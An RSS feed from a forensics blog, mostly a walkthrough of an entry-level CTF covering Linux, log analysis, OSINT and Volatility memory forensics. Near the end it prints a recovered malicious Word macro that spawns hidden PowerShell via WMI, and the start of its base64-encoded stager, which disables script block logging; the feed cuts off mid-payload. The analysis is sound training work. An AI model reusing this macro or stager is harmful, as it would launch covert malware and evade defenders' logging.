@@ -1,0 +1,1703 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on DFIR</title><link>https://who1s.github.io/posts/</link><description>Recent content in Posts on DFIR</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>It's all about forensics</copyright><lastBuildDate>Thu, 23 Sep 2021 16:04:40 +0000</lastBuildDate><atom:link href="https://who1s.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>[0x07] Migrated to Github</title><link>https://who1s.github.io/posts/2021/09/0x07-migrated-to-github/</link><pubDate>Thu, 23 Sep 2021 16:04:40 +0000</pubDate><guid>https://who1s.github.io/posts/2021/09/0x07-migrated-to-github/</guid><description>I decided to change my blog from self-hosted jekyll site to auto deployed hugo.
+Because of this, my blog&amp;rsquo;s RSS feed also changed. You can find the new RSS link from footer.
+I will likely release more but less structured content on this blog in the future.</description><content type="html"><![CDATA[<p>I decided to change my blog from self-hosted jekyll site to auto deployed hugo.</p>
+<p>Because of this, my blog&rsquo;s RSS feed also changed. You can find the new RSS link from footer.</p>
+<p>I will likely release more but less structured content on this blog in the future.</p>
+]]></content></item><item><title>[0x06] Cyber Security Essentials CTF</title><link>https://who1s.github.io/posts/2020/07/0x06-cyber-security-essentials-ctf/</link><pubDate>Thu, 23 Jul 2020 14:00:00 +0000</pubDate><guid>https://who1s.github.io/posts/2020/07/0x06-cyber-security-essentials-ctf/</guid><description>Cyber Security Essentials is a course series I was organizing in HelSec with Future Female. CSE had 6 lectures and the CTF was organized at the end of the course. The course was aimed for female who are interested working in technical side of the Cyber Security OR just started in the field. This CTF was made 99% by me alone and was purposed to be entry level. More information about the course series can be found from here.</description><content type="html"><![CDATA[<blockquote>
+<p>Cyber Security Essentials is a course series I was organizing in <a href="https://helsec.fi">HelSec</a> with <a href="https://www.futurefemale.com">Future Female</a>. CSE had 6 lectures and the CTF was organized at the end of the course. The course was aimed for female who are interested working in technical side of the Cyber Security OR just started in the field. This CTF was made 99% by me alone and was purposed to be entry level. More information about the course series can be found from <a href="https://www.futurefemale.com/news/future-female-x-helsec-cyber-security-essentials/">here</a>.</p>
+</blockquote>
+<h1 id="results">Results</h1>
+<p>The competition was hosted on CTFd at <a href="https://ctf.helsec.fi">ctf.helsec.fi</a> and here are the top competitors:
+<img src="/assets/images/cse_top10.png" alt="Screenshot"></p>
+<p>Congratz all! ᕕ( ՞ ᗜ ՞ )ᕗ</p>
+<hr>
+<h1 id="challenges---q-general">Challenges -&gt; Q: General</h1>
+<h2 id="bash">Bash</h2>
+<blockquote>
+<p>Q: Recap of the Linux commands.
+Download the file and run it.
+P.S. You can cheat in this but I bet it&rsquo;s harder than doing it properly</p>
+</blockquote>
+<p>Purposed way:</p>
+<pre tabindex="0"><code>./bash
+HelSec x Future Female
+-----------------------
+exit = exit commandline
+start = start questions
+flag = print flag
+hi = say hi
+----------------------
+# flag
+Answer the questions correctly first...
+#
+#
+# start
+What command lets you run super user commands?
+Answer: sudo
+Which command changes password on Linux?
+Answer: passwd
+Which Linux text editor we used in the course?
+Answer: vim
+Which command can be used to calculate md5 hash of a file?
+Answer: md5sum
+What command will UPDATE installed packages (not just the repositories)?
+Answer: apt-get upgrade
+Get the flag with command flag
+# flag
+flag{LINUX_IZ_S0_EZ!!}
+# exit
+</code></pre><p>The mentioned unintended way would be reversing it. =)</p>
+<p>However, the flag is: flag{LINUX_IZ_S0_EZ!!}</p>
+<h2 id="numb3rs">numb3rs</h2>
+<blockquote>
+<p>Q: Hello, friend. You don&rsquo;t know me, but I know you. I want to play a game. There is only one combination of numbers that gives you the answer. Know what to do. You better hurry up. Make your choice.</p>
+</blockquote>
+<p>This is a challenge I made last year for <a href="https://disobey.fi">Disobey</a> and <a href="https://nixuchallenge.com">Nixu Challenge</a>. The idea is to make a script that solves the puzzle.</p>
+<p><img src="/assets/images/play_games.png" alt="Screenshot"></p>
+<p>Here&rsquo;s my quick and dirty version (note that there&rsquo;s lot easier ways to solve this than the code I wrote for this walk-through):</p>
+<pre tabindex="0"><code>!/usr/bin/env python3
+
+import socket
+import time
+import os
+import sys
+
+class color:
+    red = &quot;\x1b[31m&quot;
+    green = &quot;\x1b[32m&quot;
+    default = &quot;\x1b[39m&quot;
+
+def receive(s):
+    print(&quot;{}[Reveived data]{}\n\n&quot;.format(color.red, color.default))
+    data = b&quot;&quot;
+    while True:
+        # Receive data max 4096 bytes at a time
+        pack = s.recv(4096)
+        data += pack
+        # Break the loop if data is less than 1024 bytes in size
+        if len(pack) &lt; 1024:
+            break
+    # Print the output so we can more easily read how the we are doing
+    print(&quot;{}&quot;.format(data.decode(&quot;UTF-8&quot;)))
+    if &quot;flag&quot; in data.decode(&quot;UTF-8&quot;):
+        sys.exit(1)        
+    # Sleep while before returning
+    time.sleep(0.3)
+    return data.decode(&quot;UTF-8&quot;)
+
+def send_data(s, data):
+    print(&quot;{}[Sending data]{}\n{}&quot;.format(color.green,color.default,str(data)))
+    s.send(str.encode(data))
+    # Sleep while before returning
+    time.sleep(0.3)
+    return
+
+def get_correct(data):
+    correct = &quot;&quot;
+    for char in data.split():
+        if char.isdigit():
+            return char
+
+def main():
+    while True:
+        # Connect to server
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((&quot;64.225.65.251&quot;, 1337))
+        # Get the first response
+        response=receive(s)
+
+        # Get the second response if necessary (sometimes the server sends it in the first response)
+        if &quot;61v3 numb3r&quot; not in response:
+            response=receive(s)
+
+        # Check if our sq.txt file exists, the file is used to store and read results. If not, send '1337' as response otherwise loop the file
+        if os.path.exists('./sq.txt'):
+            with open(&quot;sq.txt&quot;, &quot;r&quot;) as f:
+                for value in f:
+                    send_data(s, value.replace(&quot;\n&quot;,&quot;&quot;))
+                    response=receive(s)
+
+        # Send 1337 or any other randon number
+        send_data(s, &quot;1337&quot;)
+        # Get response and the correct number
+        response=receive(s)
+        # Close the connection
+        s.close()
+        correct_number=get_correct(response)
+
+        # Write the right number to our file
+        if os.path.exists('./sq.txt'):
+            armode = 'a'
+        else:
+            armode = 'w'
+        f = open(&quot;./sq.txt&quot;, armode)
+        f.write(correct_number+&quot;\n&quot;)
+        f.close()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre><p>Running the code will print the flag after a while</p>
+<pre tabindex="0"><code>~$ python3 solve.py
+&lt;-- Lot of output redacted --&gt;
+flag{ApPRoVEd_leE7_HAxOr_8END1n9_7hE_71mE}
+</code></pre><p>The flag is: flag{ApPRoVEd_leE7_HAxOr_8END1n9_7hE_71mE}</p>
+<hr>
+<h1 id="challenges---q-security-operations">Challenges -&gt; Q: Security Operations</h1>
+<h2 id="soc-1">SOC #1</h2>
+<blockquote>
+<p>Q: What is the centralized log system called (abbreviation)?</p>
+</blockquote>
+<p><a href="https://en.wikipedia.org/wiki/Security_information_and_event_management">SIEM</a></p>
+<h2 id="soc-2">SOC #2</h2>
+<blockquote>
+<p>Q: Which HTTP command lists all available methods (GET, POST etc.)?</p>
+</blockquote>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS">OPTIONS</a></p>
+<h2 id="soc-3">SOC #3</h2>
+<blockquote>
+<p>Q: There&rsquo;s Linux/Tsunami DOS related traffic in the access.log. What is the corresponding IP address of potentially infected host?</p>
+</blockquote>
+<p>Google: &ldquo;Linux/Tsunami DOS&rdquo; and find out <a href="https://doc.emergingthreats.net/bin/view/Main/2022760">User-Agent x00_-gawa.sa.pilipinas.2015</a>.</p>
+<pre tabindex="0"><code>~$ grep &quot;x00_-gawa.sa.pilipinas.2015&quot; access.log
+138.121.183.58 - - [22/Sep/2015:13:23:27 +0000] &quot;GET /Ringing.at.your.dorbell! HTTP/1.0&quot; 404 459 &quot;http://google.com/search?q=2+guys+1+horse&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+37.17.130.36 - - [01/Oct/2015:01:26:48 +0000] &quot;GET /Ringing.at.your.dorbell! HTTP/1.0&quot; 404 459 &quot;http://google.com/search?q=2+guys+1+horse&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+37.17.130.36 - - [01/Oct/2015:01:26:48 +0000] &quot;GET / HTTP/1.0&quot; 200 329 &quot;-&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+37.17.130.36 - - [01/Oct/2015:01:26:49 +0000] &quot;GET / HTTP/1.0&quot; 200 329 &quot;-&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+37.17.130.36 - - [01/Oct/2015:01:26:50 +0000] &quot;GET / HTTP/1.0&quot; 200 329 &quot;-&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+</code></pre><p>The answer is 37.17.130.36 (see the HTTP response 200 vs 404).</p>
+<h2 id="soc-4">SOC #4</h2>
+<blockquote>
+<p>Q: Which host has most entries in the access.log? Answer the IP address.</p>
+</blockquote>
+<pre tabindex="0"><code>~$ awk '{print $1}' access.log|sort|uniq -c|sort -nr|head -n3
+     73 61.160.247.11
+     59 222.186.21.90
+     28 89.110.147.28
+</code></pre><p>Answer: 61.160.247.11</p>
+<h2 id="soc5">SOC#5</h2>
+<blockquote>
+<p>Q: IP address 61.160.247.11 has the most entiries in the access.log. How many?</p>
+</blockquote>
+<pre tabindex="0"><code>~$ grep &quot;61.160.247.11&quot; access.log|wc -l
+73
+</code></pre><hr>
+<h1 id="challenges---q-osint">Challenges -&gt; Q: OSINT</h1>
+<h2 id="osint-1">OSINT #1</h2>
+<blockquote>
+<p>Q: Investigate <a href="mailto:foo.bar@ctf.helsec.fi">foo.bar@ctf.helsec.fi</a></p>
+</blockquote>
+<p>This challenge was supposed to be simple OSINT challenge but it turned out to be impossible&hellip; because either I screwed up or pastebin deleted the paste. I &ldquo;dumped&rdquo; password for the account <a href="mailto:foo.bar@ctf.helsec.fi">foo.bar@ctf.helsec.fi</a> and if I recall right, the paste was available the next day it was uploaded. For some reason it is not listed anymore.</p>
+<h2 id="osint-2">OSINT #2</h2>
+<blockquote>
+<p>Q: Can you find anything special from foobar.helsec.fi ?</p>
+</blockquote>
+<p>DNS stuff:</p>
+<pre tabindex="0"><code>~$ host foobar.helsec.fi
+foobar.helsec.fi has address 127.0.0.1
+ ~$ host -t TXT foobar.helsec.fi
+foobar.helsec.fi descriptive text &quot;c29tZXRoaW5nc3BlY2lhbC5oZWxzZWMuZmkK&quot;
+ ~$ echo &quot;c29tZXRoaW5nc3BlY2lhbC5oZWxzZWMuZmkK&quot;|base64 -d
+somethingspecial.helsec.fi
+
+
+ ~$ host somethingspecial.helsec.fi
+somethingspecial.helsec.fi has address 127.0.0.1
+ ~$ host -t TXT somethingspecial.helsec.fi
+somethingspecial.helsec.fi descriptive text &quot;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&quot;
+ ~$ echo &quot;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&quot;|base64 -d
+synt{GURER_VF_NYJNLF_FBZRGUVAT_VA_QAF}
+~$ echo &quot;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&quot;|base64 -d|rot13
+flag{THERE_IS_ALWAYS_SOMETHING_IN_DNS}
+</code></pre><h2 id="osint-3">OSINT #3</h2>
+<blockquote>
+<p>Q: Rodrigo Gonzales is slipping from OPSEC on their recent beer related social media post.</p>
+</blockquote>
+<p><a href="https://twitter.com/rodrigo_gonaz/status/1270298024774959104">https://twitter.com/rodrigo_gonaz/status/1270298024774959104</a></p>
+<pre tabindex="0"><code>~$ echo &quot;ZmxhZ3swUFMzQ30K&quot;|base64 -d
+flag{0PS3C}
+</code></pre><hr>
+<h1 id="challenges---q-memory-forensics">Challenges -&gt; Q: Memory forensics</h1>
+<h2 id="volatility-profile">Volatility profile</h2>
+<blockquote>
+<p>Q: What is the correct Volatility profile of the image file?</p>
+</blockquote>
+<p>The profile can be determined using imageinfo and kdbgscan. The kdbgscan gives following result:</p>
+<pre tabindex="0"><code>**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_14393 (6.4.14393 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_14393
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_17763 (6.4.17763 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_17763
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_17134 (6.4.17134 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_17134
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_10586 (6.4.10586 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_10586
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_16299 (6.4.16299 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_16299
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win2016x64_14393 (6.4.14393 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win2016x64_14393
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_15063 (6.4.15063 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_15063
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+</code></pre><p>We can see the correct Windows build version from Version64 field:</p>
+<pre tabindex="0"><code>Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+</code></pre><p>This means the right profile is Win10x64_17763.</p>
+<p>Hint: After the correct profile is determined, I suggest you to run following to save time:</p>
+<pre tabindex="0"><code>for plugin in pstree pslist psscan psxview dlllist getsids handles netscan filescan malfind svcscan cmdscan consoles; do vol.py -f finalboss.mem --profile=Win10x64_17763 $plugin |tee $plugin.txt; done
+</code></pre><p>This will run some basic plugins and write text files out of them for further analysis. There are some wrappers that do this more efficiently (f.e. multithreading &amp; dump artifacts) but this is good start. =)</p>
+<h2 id="image-time">Image time</h2>
+<blockquote>
+<p>Q: When was the image taken?</p>
+</blockquote>
+<p>The imageinfo plugin outputs following:</p>
+<pre tabindex="0"><code>Suggested Profile(s) : Win10x64_17134, Win10x64_14393, Win10x64_10586, Win10x64_16299, Win2016x64_14393, Win10x64_17763, Win10x64_15063 (Instantiated with Win10x64_15063)
+           AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
+           AS Layer2 : FileAddressSpace (/home/kali/cse/mem/finalboss.mem)
+            PAE type : No PAE
+                 DTB : 0x1ad002L
+                KDBG : 0xf8024dab65e0L
+Number of Processors : 2
+Image Type (Service Pack) : 0
+      KPCR for CPU 0 : 0xfffff8024c998000L
+      KPCR for CPU 1 : 0xffff858058920000L
+   KUSER_SHARED_DATA : 0xfffff78000000000L
+ Image date and time : 2020-02-12 21:04:47 UTC+0000
+Image local date and time : 2020-02-12 23:04:47 +0200
+</code></pre><p>The answer is 2020-02-12 21:04:47 UTC+0000.</p>
+<h2 id="imaging">Imaging</h2>
+<blockquote>
+<p>Q: Which software was LIKELY used to take the image?</p>
+</blockquote>
+<p>Following program has been executed few seconds before the memory dump was taken:</p>
+<pre tabindex="0"><code>... 0xffff980f736ce500:FTK Imager.exe                5608   1488     22      0 2020-02-12 21:04:13 UTC+0000
+</code></pre><p>FTK Imager is also known tool for memory dumping.</p>
+<h2 id="user-name">User name</h2>
+<blockquote>
+<p>Q: What is the name of the main user on the workstation?</p>
+</blockquote>
+<p>User accounts always start with SID S-1-5-21 so we can grep that string from getsids:</p>
+<pre tabindex="0"><code>~$ cat getsids.txt|grep &quot;S-1-5-21-&quot;|cut -d':' -f2|sort|uniq -c|sort -nr|head -n100
+     49  S-1-5-21-2034586335-2782532192-897599191-513 (Domain Users)
+     49  S-1-5-21-2034586335-2782532192-897599191-1001 (Rodrigo Gonzales)
+</code></pre><p>The first one is group, the second one is user (RID &gt;= 1000). The answer is Rodrigo Gonzales</p>
+<h2 id="malicious-document">Malicious document</h2>
+<blockquote>
+<p>Q: What is the name of the suspicious macro document? Please include the file extension in the answer.</p>
+</blockquote>
+<p>Office tools are usually used to open macro documents, pslist shows Word has been executed:</p>
+<pre tabindex="0"><code>~$ grep -i word pslist.txt
+0xffff980f75c52080 WINWORD.EXE            2796   1488     18        0      1      1 2020-02-12 20:56:01 UTC+0000
+</code></pre><p>Let&rsquo;s check handles of the process if there&rsquo;s something suspicious:</p>
+<pre tabindex="0"><code>~$ grep 2796 handles.txt|grep -i doc
+0xffff980f7581bb40   2796              0xde4           0x12019f File             \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>The answer is pystyy_vetaeae-invitation.docm</p>
+<h2 id="carrier">Carrier</h2>
+<blockquote>
+<p>Q: What is the process ID (PID) of the process, which started the malicious execution (e.q. opened the carrier file (the macro document))?</p>
+</blockquote>
+<p>This question is basically reversed version of the Malicious document question. Let&rsquo;s grep the name from handles and get the same output. =)</p>
+<pre tabindex="0"><code>~$ grep pystyy_vetaeae-invitation.docm handles.txt
+0xffff980f7581bb40   2796              0xde4           0x12019f File             \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>This can also be confirmed by checking cmdlines of every executed porcess:</p>
+<pre tabindex="0"><code>~$ grep pystyy_veta cmdline.txt -B1
+WINWORD.EXE pid:   2796
+Command line : &quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot; /n &quot;C:\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm&quot; /o &quot;&quot;
+</code></pre><p>The answer is 2796.</p>
+<h2 id="carrier-time">Carrier time</h2>
+<blockquote>
+<p>Q: When the process with ID 2796 was started?</p>
+</blockquote>
+<p>Pslist has column for process start times:</p>
+<pre tabindex="0"><code>~$ grep 2796 pslist.txt
+0xffff980f75c52080 WINWORD.EXE            2796   1488     18        0      1      1 2020-02-12 20:56:01 UTC+0000
+</code></pre><p>The answer is 2020-02-12-20-56-01</p>
+<h2 id="macros-macros-macros">Macros macros macros</h2>
+<blockquote>
+<p>Q: What is the process ID (PID) of the process, which WAS started by the macro document?</p>
+</blockquote>
+<p>This one is more tricky. The Word is not parent process of this process as the macros execute.</p>
+<p>We can see PowerShell process executed by WMI. This kind of behaviour should be investigated more closely and could be the one! However, we can&rsquo;t verify it without investigating the macros:</p>
+<pre tabindex="0"><code>... 0xffff980f7292f240:WmiPrvSE.exe                  3416    840     10      0 2020-02-12 20:52:49 UTC+0000
+       audit: \Device\HarddiskVolume4\Windows\System32\wbem\WmiPrvSE.exe
+       cmd: C:\Windows\system32\wbem\wmiprvse.exe
+       path: C:\Windows\system32\wbem\wmiprvse.exe
+.... 0xffff980f7590d080:powershell.exe               3908   3416     14      0 2020-02-12 20:56:13 UTC+0000
+        audit: \Device\HarddiskVolume4\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        cmd:
+        path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</code></pre><p>Let&rsquo;s dump the docm and see the macros:</p>
+<pre tabindex="0"><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 dumpfiles -n -i -r \\.docm --dump-dir=files
+Volatility Foundation Volatility Framework 2.6.1
+DataSectionObject 0xffff980f7581bb40   2796   \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+SharedCacheMap 0xffff980f7581bb40   2796   \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>The easiest way to investigate the macros is to install oletools:</p>
+<pre tabindex="0"><code>~$ pip install oletools
+</code></pre><p>Remember to add $HOME/.local/bin to path.</p>
+<pre tabindex="0"><code>~$ olevba file.2796.0xffff980f72daa9b0.pystyy_vetaeae-invitation.docm.dat
+Public Function xsEC() As Variant
+        strComputer = &quot;.&quot;
+        Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)
+        Dim yQf As String
+        yQf = &quot;powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVg&quot;
+
+        &lt;-- Lot of base64 encoded PowerShell redacted --&gt;
+
+        Const HIDDEN_WINDOW = 0
+        Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2:Win32_Process&quot;)
+        objProcess.Create yQf, Null, objConfig, intProcessID
+End Function
+</code></pre><p>As we can see from the output, the macro starts WMI and executes the PowerShell paylaod there.</p>
+<p>This means the suspicious WMI service is oujr answer as we suspected in the first place. The answer is 3416.</p>
+<h2 id="powers-hell">Powers Hell</h2>
+<blockquote>
+<p>Q: Some suspicious powershell was executed. What was the executed command (starting with powershell -flag1 -flag2 etc&hellip;)</p>
+</blockquote>
+<p>We already extracted the PowerShell from the file with oletools. To convert it to form required by the question, we can just calculate it by pasting it to file and adding print(yQf) at the end and running it with python:</p>
+<pre tabindex="0"><code>~$ python3 powershell.txt
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBpAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AYQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJAAxADEAQgBEADgAPQBbAFIARQBGAF0ALgBBAHMAUwBlAE0AQgBsAFkALgBHAEUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBpAEUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQAMQAxAGIARAA4ACkAewAkAGEAMQA4AGUAMQA9ACQAMQAxAGIAZAA4AC4ARwBlAFQAVgBBAGwAVQBFACgAJABuAHUAbABMACkAOwBJAGYAKAAkAGEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AEUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABBADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEAbAA9AFsAQwBPAEwATABlAEMAdABpAG8ATgBzAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAFQAaQBPAG4AQQByAFkAWwBzAHQAUgBpAG4AZwAsAFMAeQBzAHQARQBNAC4ATwBCAGoAZQBDAHQAXQBdADoAOgBuAEUAdwAoACkAOwAkAFYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAYQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAQ